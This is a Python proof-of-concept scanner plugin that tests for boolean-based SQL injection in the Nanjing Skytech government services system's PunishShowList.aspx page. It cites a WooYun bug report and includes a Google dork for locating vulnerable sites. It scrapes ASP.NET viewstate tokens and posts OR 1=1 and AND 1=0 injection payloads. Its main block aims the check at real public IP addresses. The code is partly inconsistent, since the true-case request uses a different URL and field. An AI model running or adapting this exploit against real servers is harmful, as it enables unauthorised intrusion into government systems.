#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 南京擎天政务系统SQL注入(五)
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2015-0100247
description:
    peoplefreepress/PunishShowList.aspx parameter:txtComplaintcode
    理论上是可以union的，，，
    这个写一块儿确实有难度，不要喷
google dork:
    intitle:行政权力网上办事大厅
'''

import time
import re

def assign(service, arg):
    if service == 'skytech':
        return True, arg

def audit(arg):
    url = arg + 'peoplefreepress/accusation_list_page.aspx?tszx=0'
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    proxy = ('127.0.0.1', 8887)
    #获取网页参数
    code, head, res, err, _ = curl.curl2(url)
    if(code != 200):
        return False
    m = re.search(r'\'src\',\'(PunishShowList\.aspx\?q=[a-z0-9%]*)\'', res)
    if not m:
        return False
    url = arg + 'peoplefreepress/' + m.group(1)
    #获取viewstate等
    code, head, res, err, _ = curl.curl2(url)
    if code != 200:
        return False
    m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"',res)
    #print res
    if not m:
        viewstate = ''
    else:
        viewstate = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        eventvalidation = ''
    else:
        eventvalidation = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        viewstategenerator = ''
    else:
        viewstategenerator = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    #获取post表单提交url
    m = re.search(r'action="(PunishShowList\.aspx\?q=[a-z0-9%]*)"', res)
    if not m:
        return False
    post_url = arg + 'peoplefreepress/' + m.group(1)
    #构造post表单
    payload = 'asasasasasasasas'
    post_true = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&Key={payload}'.format(
        viewstate = viewstate,
        viewstategenerator = viewstategenerator,
        eventvalidation = eventvalidation,
        payload = 'asasasasasasasas\' OR \'1\'=\'1\'--'
    )
    post_false = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&ddlDept=&txtComplaintcode={payload}&Btn_Search=+&dg%3A_ctl8%3AJumpList=%E7%AC%AC1%E9%A1%B5'.format(
        viewstate = viewstate,
        viewstategenerator = viewstategenerator,
        eventvalidation = eventvalidation,
        payload = 'asasasasasasasas\' AND \'1\'=\'0\'--'
    )
    code, head, res_false, err, _ = curl.curl2(post_url, post=post_false, referer=url, header=content_type)
    if code != 200:
        return False
    code, head, res_true, err, _ = curl.curl2(url, post=post_true, referer=url, header=content_type)
    #bool注入的匹配模式
    if ('onclick="ShowClientDiv' in res_true) and ('onclick="ShowClientDiv' not in res_false):
        security_hole('SQL Injection: ' + url + ' Parameter:txtComplaintcode')

if __name__ == '__main__':
    from dummy import *
    # audit(assign('skytech', 'http://58.222.202.135:81/')[1])
    audit(assign('skytech', 'http://61.178.185.50/mqweb/')[1])